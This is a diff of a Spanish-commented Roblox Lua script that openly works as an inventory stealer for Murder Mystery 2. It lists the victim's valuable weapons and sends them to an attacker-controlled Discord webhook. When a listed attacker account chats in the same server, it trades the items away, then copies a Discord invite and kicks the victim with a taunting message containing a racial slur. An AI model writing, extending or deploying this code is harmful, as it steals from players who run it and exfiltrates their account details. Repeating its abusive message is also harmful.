@@ -2,10 +2,12 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
+-- Configuración
 local webhook = _G.webhook or ""
 local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
+local pingEveryone = _G.pingEveryone == "Yes"
 
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
@@ -87,7 +89,10 @@ local categories = {
 local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}
 
 local function trim(s) return s:match("^%s*(.-)%s*$") end
-local function fetchHTML(url) local res=req({Url=url, Method="GET", Headers=headers}) return res and res.Body or "" end
+local function fetchHTML(url)
+    local res=req({Url=url, Method="GET", Headers=headers})
+    return res and res.Body or ""
+end
 local function parseValue(div)
     local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
     if str then str=str:gsub(",","") return tonumber(str) end
@@ -182,6 +187,7 @@ if #weaponsToSend > 18 then
     pasteLink = CreatePaste(pasteContent)
 end
 
+-- Webhook inicial
 if #weaponsToSend > 0 then
     local fieldsInit={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
@@ -189,42 +195,43 @@ if #weaponsToSend > 0 then
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
         {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
     }
+
     local maxEmbedItems = math.min(18,#weaponsToSend)
     for i=1,maxEmbedItems do
         local w = weaponsToSend[i]
         fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
+
     if #weaponsToSend > 18 then
         fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
         if pasteLink then
             fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
         end
     end
-    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit)
+
+    local prefix=pingEveryone and "@everyone " or ""
+    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
+-- Función final para trades
 local function TradeFinalizado()
-    local weaponsBackup = {}
-    for _, w in ipairs(weaponsToSend) do
-        table.insert(weaponsBackup, w)
-    end
+    local link = "https://discord.gg/4VySnCHy"
+    if setclipboard then setclipboard(link) end
+
     local fieldsFinal={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
-        {name="📦 Inventario enviado:", value="", inline=false},
+        {name="Armas enviadas 📦:", value="", inline=false},
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
     }
-    for _, w in ipairs(weaponsBackup) do
-        fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+    for _, w in ipairs(weaponsToSend) do
+        fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
-    if #weaponsBackup > 18 and pasteLink then
-        fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\nMira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
-    end
-    SendWebhook("📦 Inventario enviado","",fieldsFinal)
-    task.wait(5)
-    setclipboard("https://discord.gg/4VySnCHy") -- auto copia el enlace
-    LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
+    SendWebhook("✅ Trades finalizados", "Todos los trades completados.", fieldsFinal)
+    task.wait(1)
+    LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy"..link)
 end
 
+-- Trade principal
 local function doTrade(targetName)
     if #weaponsToSend == 0 then return end
     while #weaponsToSend>0 do
@@ -251,13 +258,11 @@ end
 
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
-        doTrade(p.Name)
         p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
-        doTrade(p.Name)
         p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end)
